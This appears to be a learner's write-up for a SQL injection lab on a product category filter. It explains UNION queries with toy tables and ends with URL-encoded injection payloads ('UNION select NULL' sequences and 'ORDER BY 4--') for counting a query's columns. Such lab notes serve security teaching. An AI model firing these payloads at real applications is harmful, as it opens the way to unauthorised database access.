@@ -1,0 +1,50 @@
+SQL Injection - Product Category Filter
+
+END GOAL : Perform SQLi UNION attack and return the no of columns by the query. 
+
+Background (Union):
+
+Consider the below tables,
+Table_1         Table_2
+a | b           c | d
+-----           -----
+1 , 2           2 , 3
+3 , 4           4 , 5
+
+Query #1: Select a, b from Table_1
+Result :
+1 , 2
+3 , 4
+
+Query #2: Select a, b from Table_1 UNION select c, d from Table_2
+Result : 
+1 , 2
+3 , 4
+2 , 3
+4 , 5
+
+Rules:
+1. The number and the order of the columns must be the same in all queries.
+2. The data types must be compatible
+
+
+Probable SQL Statement # 1 : 
+SELECT ? from Table_1 UNION select NULL 
+Possible Results:
+Error -> Incorrect number of columns
+
+SELECT ? from Table_1 UNION select NULL, NULL,... - Iteratibily
+
+Probable SQL Statement # 2:
+SELECT a, b from Table_1 order by 1(First Column)
+
+Analysis:
+If we put ' in the Username input field, it gives Internal Server Error(broke the application at the back-end) meaning its vulnerable to SQLi Attacks
+
+Exploit Payload
+---------------
+SQL Statement #1
+'+UNION+select+NULL,+NULL,+NULL
+
+SQL Statement #2
+'ORDER+BY+4--
